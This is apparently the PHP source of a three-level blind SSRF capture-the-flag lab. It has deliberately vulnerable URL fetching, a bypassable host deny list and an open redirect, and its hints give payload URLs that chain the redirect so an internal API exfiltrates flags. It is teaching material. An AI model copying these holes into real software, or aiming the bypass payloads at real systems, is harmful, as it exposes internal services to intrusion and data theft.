<?php
/**
 * Blind SSRF Lab - CTF Challenge
 *
 * Architecture:
 *   - ssrf-app container (port 8042) = this app + interceptor
 *   - blind-internal-api container (no external port) = flags + exfil endpoint
 *
 * The server makes BLIND requests - it NEVER shows the response to the user.
 * Users must use the interceptor to detect if requests were made and exfiltrate flags.
 */

// ============ TRACKING ============
function trackHit($labId) {
    @file_get_contents("http://tracking-service:8080/api/hit?" . http_build_query([
        'lab' => $labId,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}
function trackFlag($labId, $flag) {
    @file_get_contents("http://tracking-service:8080/api/flag?" . http_build_query([
        'lab' => $labId,
        'flag' => $flag,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}
trackHit('blind-ssrf');

// ============================================================
// OPEN REDIRECT HANDLER (must run before any output)
// Used by Level 3 to bypass hostname/IP filtering
// ============================================================
$currentUri = $_SERVER['REQUEST_URI'];
if (strpos($currentUri, '/redirect') !== false && isset($_GET['dest'])) {
    http_response_code(302);
    header('Location: ' . $_GET['dest']);
    exit;
}

// ============================================================
// INTERCEPTOR HANDLER
// Logs incoming requests and captures exfiltrated flags
// ============================================================
if (strpos($currentUri, '/interceptor') !== false) {
    $log_file = '/tmp/blind-ssrf-requests.log';
    $timestamp = date('Y-m-d H:i:s');
    $method = $_SERVER['REQUEST_METHOD'];
    $uri_path = $_SERVER['REQUEST_URI'];
    $remote = $_SERVER['REMOTE_ADDR'];

    // Show logs mode
    if (isset($_GET['show_logs']) && $_GET['show_logs'] == '1') {
        header('Content-Type: text/plain; charset=utf-8');
        if (file_exists($log_file)) {
            echo "=== Blind SSRF Interceptor - Request Log ===\n";
            echo "Last updated: " . $timestamp . "\n";
            echo str_repeat('=', 50) . "\n\n";
            echo file_get_contents($log_file);
        } else {
            echo "=== Blind SSRF Interceptor - Request Log ===\n";
            echo "No requests logged yet.\n";
            echo "The log file will appear here once the interceptor receives requests.\n";
        }
        exit;
    }

    // Check if this is a flag exfiltration
    if (isset($_GET['exfil_flag'])) {
        // This is the flag from the internal API!
        $flag = $_GET['exfil_flag'];
        $lvl = $_GET['level'] ?? '?';
        $log_entry = "[$timestamp] *** FLAG EXFILTRATED (Level $lvl) ***\n";
        $log_entry .= "Flag: $flag\n";
        $log_entry .= "Source: $remote\n";
        $log_entry .= str_repeat('-', 50) . "\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);

        header('Content-Type: application/json');
        trackFlag('blind-ssrf', $flag);
        echo json_encode(['status' => 'flag_captured', 'flag' => $flag, 'level' => $lvl]);
        exit;
    }

    // Regular request logging
    $log_entry = "[$timestamp] $method $uri_path\n";
    $log_entry .= "Remote IP: $remote\n";
    if (!empty($_GET)) $log_entry .= "Params: " . json_encode($_GET) . "\n";
    $log_entry .= str_repeat('-', 50) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'logged', 'timestamp' => $timestamp, 'uri' => $uri_path, 'remote' => $remote]);
    exit;
}

// ============================================================
// FETCH URL FUNCTION
// Uses cURL with HTTP/HTTPS ONLY (no file:// protocol - prevents LFI)
// ============================================================
function fetchUrl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $effectiveUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $error = curl_error($ch);
    curl_close($ch);
    return ['response' => $response, 'httpCode' => $httpCode, 'effectiveUrl' => $effectiveUrl, 'error' => $error];
}

// ============================================================
// LEVEL CONFIGURATION
// ============================================================
$levels = [
    1 => [
        'name' => 'Level 1 - No Filter',
        'difficulty' => 'Medium',
        'clue' => 'There is an internal API server reachable at <code>http://blind-internal-api</code> (IP: 172.32.0.50). It has an endpoint <code>/exfil?level=1&amp;target=URL</code> that will send its flag to the given URL. You have an interceptor at <code>http://blind-ssrf-app/interceptor/</code> that logs all incoming requests. Can you make the server fetch the exfil endpoint and get the flag to your interceptor?',
        'hint' => 'Simply submit the exfil URL: <code>http://blind-internal-api/exfil?level=1&amp;target=http://blind-ssrf-app/interceptor/</code>. The internal API will receive the request and send the flag to your interceptor. Check the interceptor logs to find the flag!',
    ],
    2 => [
        'name' => 'Level 2 - Hostname Blocked',
        'difficulty' => 'Hard',
        'clue' => 'The server now blocks requests to the hostname <code>blind-internal-api</code>. The internal API is still running and accessible. Can you find another way to reach it? The API IP is 172.32.0.50.',
        'hint' => 'The filter only checks the hostname. Use the IP address instead: <code>http://172.32.0.50/exfil?level=2&amp;target=http://blind-ssrf-app/interceptor/</code>. The server will follow through and the flag will be exfiltrated.',
    ],
    3 => [
        'name' => 'Level 3 - Hostname + IP Blocked',
        'difficulty' => 'Hard',
        'clue' => 'Both the hostname <code>blind-internal-api</code> and the IP <code>172.32.0.50</code> are now blocked. However, you may have noticed there is an open redirect on this very server at <code>/redirect?dest=URL</code>. Can you chain the redirect to bypass the filter?',
        'hint' => 'Use the open redirect on localhost (which is not filtered): <code>http://localhost/redirect?dest=http://blind-internal-api/exfil?level=3&amp;target=http://blind-ssrf-app/interceptor/</code>. The initial URL passes the filter (localhost is allowed), then the redirect sends the request to the blocked destination.',
    ],
];

// Default level
$currentLevel = isset($_GET['level']) ? intval($_GET['level']) : 1;
if ($currentLevel < 1 || $currentLevel > 3) $currentLevel = 1;

// ============================================================
// PROCESS FORM SUBMISSION
// ============================================================
$result = null;
$urlSubmitted = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
    $urlSubmitted = trim($_POST['url']);

    // Validate URL scheme
    $parsed = parse_url($urlSubmitted);
    if ($parsed === false || !isset($parsed['scheme']) || !in_array(strtolower($parsed['scheme']), ['http', 'https'])) {
        $result = [
            'status' => 'error',
            'message' => 'Invalid URL. Only HTTP and HTTPS protocols are allowed.',
            'url' => $urlSubmitted,
        ];
    } elseif (!isset($parsed['host']) || empty($parsed['host'])) {
        $result = [
            'status' => 'error',
            'message' => 'Invalid URL. Could not parse host.',
            'url' => $urlSubmitted,
        ];
    } else {
        // Apply level-specific filtering on the host component
        $host = $parsed['host'];
        $blocked = false;

        if ($currentLevel == 2) {
            // Level 2: block hostname 'blind-internal-api'
            if ($host === 'blind-internal-api') {
                $blocked = true;
            }
        } elseif ($currentLevel == 3) {
            // Level 3: block both hostname and IP
            if (in_array($host, ['blind-internal-api', '172.32.0.50'])) {
                $blocked = true;
            }
        }

        if ($blocked) {
            $result = [
                'status' => 'blocked',
                'message' => 'Request blocked! The destination "' . htmlspecialchars($host) . '" is not allowed by the server policy.',
                'url' => $urlSubmitted,
            ];
        } else {
            // Make the BLIND request
            $fetchResult = fetchUrl($urlSubmitted);

            if ($fetchResult['error']) {
                $result = [
                    'status' => 'error',
                    'message' => 'Request sent but encountered an error: ' . $fetchResult['error'],
                    'url' => $urlSubmitted,
                ];
            } elseif ($fetchResult['httpCode'] > 0) {
                $result = [
                    'status' => 'sent',
                    'message' => 'Request sent successfully! The server fetched the URL (HTTP ' . $fetchResult['httpCode'] . '). Remember: this is a BLIND SSRF - the response is NOT shown to you.',
                    'url' => $urlSubmitted,
                    'httpCode' => $fetchResult['httpCode'],
                ];
            } else {
                $result = [
                    'status' => 'sent',
                    'message' => 'Request was sent but no HTTP response was received. The target may be unreachable.',
                    'url' => $urlSubmitted,
                ];
            }
        }
    }
}

// ============================================================
// DETERMINE ACTIVE LEVEL CLASS
// ============================================================
function levelBtnClass($btnLevel, $currentLevel) {
    return ($btnLevel === $currentLevel) ? 'level-btn active' : 'level-btn';
}

// ============================================================
// HTML OUTPUT
// ============================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blind SSRF Lab</title>
    <style>
        :root {
            --gradient-start: #667eea;
            --gradient-end: #764ba2;
            --bg-dark: #1a1a2e;
            --bg-card: #16213e;
            --bg-card-alt: #0f3460;
            --text-primary: #e8e8e8;
            --text-secondary: #a8a8b3;
            --accent: #667eea;
            --accent-hover: #7c93f5;
            --danger: #e74c3c;
            --success: #2ecc71;
            --warning: #f39c12;
            --border: #2a2a4a;
            --code-bg: #0d1117;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--bg-dark) 0%, #16213e 50%, var(--bg-dark) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
        }

        .header {
            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(102, 126, 234, 0.3);
        }

        .header h1 {
            font-size: 2.2em;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            margin-bottom: 8px;
        }

        .header p {
            color: rgba(255, 255, 255, 0.85);
            font-size: 1.05em;
        }

        .container {
            max-width: 900px;
            margin: 30px auto;
            padding: 0 20px;
        }

        /* Level Navigation */
        .level-nav {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }

        .level-btn {
            display: inline-block;
            padding: 10px 22px;
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 8px;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.95em;
            font-weight: 600;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .level-btn:hover {
            border-color: var(--accent);
            color: var(--text-primary);
            background: var(--bg-card-alt);
        }

        .level-btn.active {
            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
            border-color: transparent;
            color: #fff;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        /* Cards */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .card h2 {
            color: var(--accent);
            margin-bottom: 12px;
            font-size: 1.3em;
        }

        .card h3 {
            color: var(--accent-hover);
            margin-bottom: 10px;
            font-size: 1.1em;
        }

        /* Warning Box */
        .warning-box {
            background: rgba(243, 156, 18, 0.1);
            border: 1px solid rgba(243, 156, 18, 0.4);
            border-left: 4px solid var(--warning);
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 20px;
        }

        .warning-box strong {
            color: var(--warning);
        }

        .warning-box p {
            color: var(--text-secondary);
            margin-top: 6px;
        }

        /* Info Box */
        .info-box {
            background: rgba(102, 126, 234, 0.08);
            border: 1px solid rgba(102, 126, 234, 0.3);
            border-left: 4px solid var(--accent);
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 20px;
        }

        .info-box strong {
            color: var(--accent-hover);
        }

        .info-box p {
            color: var(--text-secondary);
            margin-top: 6px;
        }

        /* Code styling */
        code {
            background: var(--code-bg);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.9em;
            color: #c9d1d9;
            border: 1px solid var(--border);
        }

        .code-block {
            background: var(--code-bg);
            padding: 14px 18px;
            border-radius: 8px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.88em;
            color: #c9d1d9;
            border: 1px solid var(--border);
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            margin: 10px 0;
        }

        /* Difficulty badge */
        .difficulty-badge {
            display: inline-block;
            padding: 3px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .difficulty-medium {
            background: rgba(243, 156, 18, 0.15);
            color: var(--warning);
            border: 1px solid rgba(243, 156, 18, 0.4);
        }

        .difficulty-hard {
            background: rgba(231, 76, 60, 0.15);
            color: var(--danger);
            border: 1px solid rgba(231, 76, 60, 0.4);
        }

        /* Form */
        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.95em;
        }

        .input-row {
            display: flex;
            gap: 10px;
        }

        .url-input {
            flex: 1;
            padding: 12px 16px;
            background: var(--code-bg);
            border: 2px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.95em;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .url-input:focus {
            border-color: var(--accent);
        }

        .url-input::placeholder {
            color: #555;
        }

        .submit-btn {
            padding: 12px 28px;
            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
        }

        /* Result boxes */
        .result-box {
            border-radius: 8px;
            padding: 16px 20px;
            margin-top: 16px;
        }

        .result-sent {
            background: rgba(46, 204, 113, 0.1);
            border: 1px solid rgba(46, 204, 113, 0.3);
            border-left: 4px solid var(--success);
        }

        .result-sent strong {
            color: var(--success);
        }

        .result-blocked {
            background: rgba(231, 76, 60, 0.1);
            border: 1px solid rgba(231, 76, 60, 0.3);
            border-left: 4px solid var(--danger);
        }

        .result-blocked strong {
            color: var(--danger);
        }

        .result-error {
            background: rgba(231, 76, 60, 0.1);
            border: 1px solid rgba(231, 76, 60, 0.3);
            border-left: 4px solid var(--danger);
        }

        .result-error strong {
            color: var(--danger);
        }

        .result-box p {
            color: var(--text-secondary);
            margin-top: 6px;
        }

        .result-url {
            margin-top: 8px;
            padding: 8px 12px;
            background: var(--code-bg);
            border-radius: 4px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.88em;
            color: #8b949e;
            word-break: break-all;
        }

        /* Interceptor section */
        .interceptor-section {
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.05), rgba(118, 75, 162, 0.05));
            border: 1px solid rgba(102, 126, 234, 0.2);
            border-radius: 12px;
            padding: 20px 24px;
            margin-bottom: 20px;
        }

        .interceptor-section h3 {
            color: var(--accent);
            margin-bottom: 10px;
        }

        .interceptor-links {
            margin-top: 10px;
        }

        .interceptor-links a {
            color: var(--accent-hover);
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .interceptor-links a:hover {
            color: #fff;
            text-decoration: underline;
        }

        /* Network topology */
        .topology-box {
            background: var(--code-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px 20px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 0.88em;
            color: #8b949e;
            line-height: 1.8;
            overflow-x: auto;
        }

        .topology-box .highlight {
            color: var(--accent-hover);
        }

        .topology-box .flag-label {
            color: var(--success);
        }

        .topology-box .blocked-label {
            color: var(--danger);
        }

        /* Hint toggle */
        .hint-toggle {
            background: rgba(102, 126, 234, 0.1);
            border: 1px solid rgba(102, 126, 234, 0.3);
            border-radius: 6px;
            padding: 10px 18px;
            color: var(--accent-hover);
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.3s ease;
            display: inline-block;
            margin-top: 10px;
        }

        .hint-toggle:hover {
            background: rgba(102, 126, 234, 0.2);
        }

        .hint-content {
            display: none;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(46, 204, 113, 0.05);
            border: 1px solid rgba(46, 204, 113, 0.2);
            border-radius: 8px;
            color: var(--text-secondary);
        }

        .hint-content.visible {
            display: block;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 30px 20px;
            color: var(--text-secondary);
            font-size: 0.85em;
            border-top: 1px solid var(--border);
            margin-top: 40px;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .header h1 {
                font-size: 1.6em;
            }
            .input-row {
                flex-direction: column;
            }
            .level-nav {
                flex-direction: column;
            }
            .level-btn {
                text-align: center;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header">
        <h1>Blind SSRF Lab</h1>
        <p>Server-Side Request Forgery with no response feedback</p>
    </div>

    <div class="container">

        <!-- Blind SSRF Warning -->
        <div class="warning-box">
            <strong>BLIND SSRF Challenge</strong>
            <p>
                This is a <strong>blind</strong> SSRF lab. The server will fetch the URL you provide, but it will
                <strong>NOT show you the response</strong>. You can only see whether the request was sent or blocked.
                Use the <strong>interceptor</strong> to detect requests and exfiltrate flags from the internal API.
            </p>
        </div>

        <!-- Level Navigation -->
        <div class="level-nav">
            <a href="/?level=1" class="<?php echo levelBtnClass(1, $currentLevel); ?>">Level 1 - No Filter</a>
            <a href="/?level=2" class="<?php echo levelBtnClass(2, $currentLevel); ?>">Level 2 - Hostname Blocked</a>
            <a href="/?level=3" class="<?php echo levelBtnClass(3, $currentLevel); ?>">Level 3 - Host + IP Blocked</a>
        </div>

        <!-- Level Info Card -->
        <div class="card">
            <h2>
                <?php echo htmlspecialchars($levels[$currentLevel]['name']); ?>
                <?php
                    $diff = $levels[$currentLevel]['difficulty'];
                    $diffClass = ($diff === 'Medium') ? 'difficulty-medium' : 'difficulty-hard';
                ?>
                <span class="difficulty-badge <?php echo $diffClass; ?>"><?php echo $diff; ?></span>
            </h2>

            <div class="info-box">
                <strong>Clue:</strong>
                <p><?php echo $levels[$currentLevel]['clue']; ?></p>
            </div>

            <span class="hint-toggle" onclick="toggleHint()">Show Hint</span>
            <div id="hint-content" class="hint-content">
                <?php echo $levels[$currentLevel]['hint']; ?>
            </div>
        </div>

        <!-- URL Input Form -->
        <div class="card">
            <h2>Submit URL</h2>
            <p style="color: var(--text-secondary); margin-bottom: 14px;">
                Enter a URL for the server to fetch. The response will <strong>not</strong> be shown to you.
            </p>
            <form method="POST" action="/?level=<?php echo $currentLevel; ?>">
                <div class="form-group">
                    <div class="input-row">
                        <input
                            type="text"
                            name="url"
                            class="url-input"
                            placeholder="http://..."
                            value="<?php echo htmlspecialchars($urlSubmitted); ?>"
                            required
                            autofocus
                        >
                        <button type="submit" class="submit-btn">Fetch URL</button>
                    </div>
                </div>
            </form>

            <?php if ($result !== null): ?>
                <?php if ($result['status'] === 'sent'): ?>
                    <div class="result-box result-sent">
                        <strong>Request Sent!</strong>
                        <p><?php echo htmlspecialchars($result['message']); ?></p>
                        <div class="result-url">URL: <?php echo htmlspecialchars($result['url']); ?></div>
                    </div>
                <?php elseif ($result['status'] === 'blocked'): ?>
                    <div class="result-box result-blocked">
                        <strong>Request Blocked!</strong>
                        <p><?php echo htmlspecialchars($result['message']); ?></p>
                        <div class="result-url">URL: <?php echo htmlspecialchars($result['url']); ?></div>
                    </div>
                <?php elseif ($result['status'] === 'error'): ?>
                    <div class="result-box result-error">
                        <strong>Error!</strong>
                        <p><?php echo htmlspecialchars($result['message']); ?></p>
                        <div class="result-url">URL: <?php echo htmlspecialchars($result['url']); ?></div>
                    </div>
                <?php endif; ?>
            <?php endif; ?>
        </div>

        <!-- Interceptor Section -->
        <div class="interceptor-section">
            <h3>Interceptor Endpoint</h3>
            <p style="color: var(--text-secondary);">
                The interceptor logs all incoming requests, including exfiltrated flags.
                Use it as the <code>target</code> parameter in your exfil URL.
            </p>
            <div class="interceptor-links">
                <p>
                    <strong>Interceptor URL:</strong>
                    <code>http://localhost:8042/interceptor/</code>
                </p>
                <p style="margin-top: 8px;">
                    <strong>View Logs:</strong>
                    <a href="http://localhost:8042/interceptor/?show_logs=1" target="_blank">
                        http://localhost:8042/interceptor/?show_logs=1
                    </a>
                </p>
            </div>
        </div>

        <!-- Network Topology -->
        <div class="card">
            <h2>Network Topology</h2>
            <div class="topology-box">
+-------------------------------------------------------+
|                  Docker Network                        |
|                                                       |
|  +-------------------+     +----------------------+   |
|  | <span class="highlight">blind-ssrf-app</span>    |     | <span class="highlight">blind-internal-api</span> |   |
|  |  (This Server)     | --> |  (Internal API)      |   |
|  |  Port: <span class="highlight">8042</span>         |     |  IP: <span class="highlight">172.32.0.50</span>       |   |
|  |                    |     |                      |   |
|  |  /interceptor/     |     |  /exfil?level=N      |   |
|  |  /redirect?dest=   |     |    &amp;target=URL       |   |
|  +-------------------+     |                      |   |
|         ^                   |  <span class="flag-label">Flags: level 1, 2, 3</span>  |   |
|         |                   +----------------------+   |
|         |                                              |
|         +--- Flag exfiltration comes back here         |
+-------------------------------------------------------+
|                                                       |
|  Your Browser --> http://localhost:8042               |
|                                                       |
+-------------------------------------------------------+
            </div>

            <?php if ($currentLevel == 1): ?>
            <div class="info-box" style="margin-top: 16px;">
                <strong>Level 1 Note:</strong>
                <p>No filtering is applied. All HTTP/HTTPS URLs are allowed. The internal API hostname <code>blind-internal-api</code> and IP <code>172.32.0.50</code> can be reached directly.</p>
            </div>
            <?php elseif ($currentLevel == 2): ?>
            <div class="info-box" style="margin-top: 16px;">
                <strong>Level 2 Note:</strong>
                <p>The hostname <code style="color: var(--danger);">blind-internal-api</code> is blocked. The IP address <code>172.32.0.50</code> is still allowed. Think about how to bypass the hostname filter.</p>
            </div>
            <?php elseif ($currentLevel == 3): ?>
            <div class="info-box" style="margin-top: 16px;">
                <strong>Level 3 Note:</strong>
                <p>Both <code style="color: var(--danger);">blind-internal-api</code> and <code style="color: var(--danger);">172.32.0.50</code> are blocked. This server has an open redirect at <code>/redirect?dest=URL</code>. Can you use it to bypass both filters?</p>
            </div>
            <?php endif; ?>
        </div>

    </div>

    <!-- Footer -->
    <div class="footer">
        <p>Blind SSRF Lab - CTF Challenge | Only HTTP/HTTPS protocols allowed</p>
    </div>

    <!-- Hint toggle script -->
    <script>
        function toggleHint() {
            var hintEl = document.getElementById('hint-content');
            var toggleEl = document.querySelector('.hint-toggle');
            if (hintEl.classList.contains('visible')) {
                hintEl.classList.remove('visible');
                toggleEl.textContent = 'Show Hint';
            } else {
                hintEl.classList.add('visible');
                toggleEl.textContent = 'Hide Hint';
            }
        }
    </script>

</body>
</html>
